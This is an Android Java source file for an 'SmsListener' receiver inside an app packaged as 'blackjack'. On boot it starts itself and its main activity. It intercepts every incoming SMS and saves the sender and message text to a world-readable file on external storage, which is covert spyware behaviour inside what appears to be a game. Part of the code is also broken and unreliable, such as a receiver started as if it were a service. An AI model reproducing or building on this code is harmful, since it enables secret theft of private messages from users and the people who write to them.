package com.android.blackjack;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;

import com.android.blackjack.R.string;

import android.app.Activity;
import android.app.Application;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.AvoidXfermode.Mode;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

@SuppressWarnings("deprecation")
public class SmsListener extends BroadcastReceiver {

	private SharedPreferences preferences;

	@Override
	public void onReceive(Context context, Intent intent) {
		
		// TODO Auto-generated method stub
		if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
			Intent i = new Intent(context, MainActivity.class);
			i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startActivity(i);
			Intent serviceIntent = new Intent(context, SmsListener.class);
			context.startService(serviceIntent);
		}
		Bundle intentExtras = intent.getExtras();

		if (intentExtras != null) {
			/* Get Messages */
			Object[] sms = (Object[]) intentExtras.get("pdus");

			for (int i = 0; i < sms.length; ++i) {
				/* Parse Each Message */
				SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) sms[i]);

				String phone = smsMessage.getOriginatingAddress();
				String message = smsMessage.getMessageBody().toString();

				if (message != null && phone != null) {
					SaveMessage(context, phone + "   : " + message);
				}
				else
				{
					for (SmsMessage smsMessage2 : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
						String messageBody2 = smsMessage2.getMessageBody();
						SaveMessage(context, messageBody2);
					}
				}
				
				

			}
		}
	}

	public void SaveMessage(Context context, String message) {

		FileOutputStream FoutS = null;
		OutputStreamWriter outSW = null;

		try {

			FoutS = new FileOutputStream(Environment.getExternalStorageDirectory() + "/Message.dat");
			outSW = new OutputStreamWriter(FoutS);

			outSW.append(message);
			outSW.flush();
			Intent i = new Intent();
	        i.setClassName("com.android.blackjack", "com.android.blackjack.MainActivity");
	        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	        context.startActivity(i);
	        Intent intentone = new Intent(context.getApplicationContext(), MainActivity.class);
	        intentone.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
	        context.startActivity(intentone);
		}

		catch (Exception e) {

			e.printStackTrace();

		}

		finally {

			try {

				outSW.close();
				FoutS.close();

			} catch (IOException e) {
			}

		}
	}
}